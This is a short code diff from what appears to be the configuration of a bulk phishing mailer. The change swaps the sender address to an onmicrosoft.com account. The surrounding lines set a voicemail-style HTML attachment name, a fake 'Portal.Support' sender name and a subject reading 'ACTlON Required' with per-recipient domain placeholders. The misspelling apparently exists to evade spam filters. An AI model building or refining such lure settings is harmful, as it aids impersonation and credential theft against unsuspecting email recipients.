@@ -122,7 +122,7 @@ const options = {
 
 
 const attachmentNameWithPlaceholders = 'vm-20241104193406035753-fadceb388a85af9bdf506d7fgds693hdj.html';
-const senderAddresses = ['john@efasglobal.com'];
+const senderAddresses = ['john@ExecutiveFacadeAdvisoryServ.onmicrosoft.com'];
 const messageFile = 'message.html';
 const senderNameWithPlaceholders = "Portal.Support"; 
 const subjectLineWithPlaceholders = "ACTlON Required- {RECIPIENT_DOMAIN_NAME} Server SecurityID:{RANDOM_STRING}";
